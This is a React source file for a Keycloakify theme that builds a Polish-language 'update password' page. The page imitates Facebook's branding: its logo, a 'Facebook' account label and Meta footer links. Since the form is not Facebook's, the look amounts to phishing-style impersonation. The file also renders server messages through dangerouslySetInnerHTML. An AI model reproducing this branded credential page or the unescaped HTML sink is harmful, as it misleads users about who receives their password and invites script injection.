import { useState } from "react";
import type { PageProps } from "keycloakify/login/pages/PageProps";
import type { KcContext } from "../KcContext";
import type { I18n } from "../i18n";
import { ChevronLeft } from "lucide-react";

import AuthButton from "../../components/AuthButton";
import CustomInput from "../../components/CustomInput";

export const FacebookIcon: React.FC<{ size?: number; className?: string }> = ({ size = 24, className = "" }) => (
  <svg
    viewBox="0 0 36 36"
    className={className}
    style={{ width: size, height: size }}
    fill="currentColor"
    xmlns="http://www.w3.org/2000/svg"
  >
    <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34v-8.954h-2.923v-4.144H14v-2.828c0-4.11 2.366-6.155 5.894-6.155 1.516 0 2.871.189 3.328.283v3.743l-2.079.001c-1.895 0-2.391 1.054-2.391 2.314v2.641h4.298l-.666 4.144h-3.632v9.825z" />
  </svg>
);

export default function LoginUpdatePassword(props: PageProps<Extract<KcContext, { pageId: "login-update-password.ftl" }>, I18n>) {
    const { kcContext } = props;
    const { url, messagesPerField, isAppInitiatedAction } = kcContext;
    const username = (kcContext as any).username ?? (kcContext as any).user?.username ?? "Użytkownik";

    const [passwordNew, setPasswordNew] = useState("");
    const [passwordConfirm, setPasswordConfirm] = useState("");
    const [isSubmitting, setIsSubmitting] = useState(false);

    return (
        <div className="min-h-screen bg-white font-sans text-[#1c1e21] flex flex-col">
            <div className="flex-1 flex justify-center pt-8 px-4">
                <div className="w-full max-w-[500px] text-left">
                    <div className="mb-5">
                        <a
                            href={url.loginUrl}
                            className="text-[#606770] hover:bg-gray-100 p-2 rounded-full transition-colors inline-block mb-2 -ml-2 cursor-pointer"
                        >
                            <ChevronLeft size={28} />
                        </a>
                        <h1 className="text-[24px] font-bold text-left">
                            Wybierz nowe hasło
                        </h1>
                    </div>

                    {/* User Profile Block */}
                    <div className="border border-[#ced0d4] rounded-xl p-4 flex items-center mb-6">
                        <div className="relative mr-4 shrink-0">
                            <img
                                src="https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=100&auto=format&fit=crop&q=60"
                                alt="Avatar"
                                className="w-14 h-14 rounded-full object-cover border border-slate-200"
                            />
                            <div className="absolute -bottom-1 -right-1 bg-white rounded-full p-[2px]">
                                <div className="bg-[#1877f2] text-white rounded-full w-5 h-5 flex items-center justify-center">
                                    <FacebookIcon size={14} />
                                </div>
                            </div>
                        </div>
                        <div>
                            <div className="font-semibold text-[17px] leading-tight mb-0.5">
                                {username ?? "Użytkownik"}
                            </div>
                            <div className="text-[#606770] text-[15px] leading-tight">
                                Facebook
                            </div>
                        </div>
                    </div>

                    <form
                        id="kc-passwd-update-form"
                        action={url.loginAction}
                        method="post"
                        onSubmit={() => {
                            setIsSubmitting(true);
                            return true;
                        }}
                        className="space-y-4"
                    >
                        {kcContext.message !== undefined && (
                            <div className={`p-3 text-sm rounded-lg border text-left ${
                                kcContext.message.type === "error"
                                    ? "text-red-600 bg-red-50 border-red-200"
                                    : "text-blue-600 bg-blue-50 border-blue-200"
                            }`}>
                                <span dangerouslySetInnerHTML={{ __html: kcContext.message.summary }} />
                            </div>
                        )}

                        <div className="space-y-4 mb-6">
                            <CustomInput
                                id="password-new"
                                name="password-new"
                                value={passwordNew}
                                onChange={(e) => setPasswordNew(e.target.value)}
                                type="password"
                                label="Nowe hasło"
                                disableFocusColor={true}
                                error={messagesPerField.existsError("password")}
                                autoFocus
                            />

                            <CustomInput
                                id="password-confirm"
                                name="password-confirm"
                                value={passwordConfirm}
                                onChange={(e) => setPasswordConfirm(e.target.value)}
                                type="password"
                                label="Potwierdź nowe hasło"
                                disableFocusColor={true}
                                error={messagesPerField.existsError("password-confirm")}
                            />
                        </div>

                        {/* Optional logout other sessions checkbox */}
                        <div className="flex items-center gap-2 text-left mb-6">
                            <input
                                type="checkbox"
                                id="logout-sessions"
                                name="logout-sessions"
                                value="on"
                                defaultChecked={true}
                                className="rounded border-gray-300 text-primary focus:ring-primary"
                            />
                            <label htmlFor="logout-sessions" className="text-sm text-slate-600">
                                Wyloguj inne aktywne sesje
                            </label>
                        </div>

                        <div className="flex flex-col gap-3">
                            <AuthButton
                                type="submit"
                                disabled={passwordNew.length === 0 || passwordConfirm.length === 0 || isSubmitting}
                            >
                                {isSubmitting ? "Zapisywanie..." : "Zapisz hasło"}
                            </AuthButton>

                            {isAppInitiatedAction && (
                                <button
                                    type="submit"
                                    name="cancel-aia"
                                    value="true"
                                    className="w-full bg-white border border-[#ced0d4] text-[#1c1e21] font-semibold text-[16px] rounded-full py-3 hover:bg-gray-50 transition-colors focus:outline-none cursor-pointer"
                                >
                                    Anuluj
                                </button>
                            )}
                        </div>
                    </form>
                </div>
            </div>

            <div className="mt-auto pt-10 pb-6 px-4 flex flex-col items-center">
                <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 text-[13px] text-[#606770] max-w-[800px] mb-4">
                    <span className="text-[#1c1e21] font-semibold">Polski</span>
                    <a href="#" className="hover:underline">English (US)</a>
                    <a href="#" className="hover:underline">ślōnskŏ gŏdka</a>
                    <a href="#" className="hover:underline">Русский</a>
                    <a href="#" className="hover:underline">Deutsch</a>
                    <a href="#" className="hover:underline">Français (France)</a>
                    <a href="#" className="hover:underline">Italiano</a>
                    <a href="#" className="hover:underline font-semibold">Więcej języków...</a>
                </div>
                <div className="w-full max-w-[800px] border-t border-gray-200 pt-4 flex flex-wrap justify-center gap-x-4 gap-y-2 text-[12px] text-[#606770]">
                    <a href="#" className="hover:underline">Zarejestruj się</a>
                    <a href="#" className="hover:underline">Zaloguj się</a>
                    <a href="#" className="hover:underline">Messenger</a>
                    <a href="#" className="hover:underline">Facebook Lite</a>
                    <a href="#" className="hover:underline">Film</a>
                    <a href="#" className="hover:underline">Meta Pay</a>
                </div>
            </div>
        </div>
    );
}
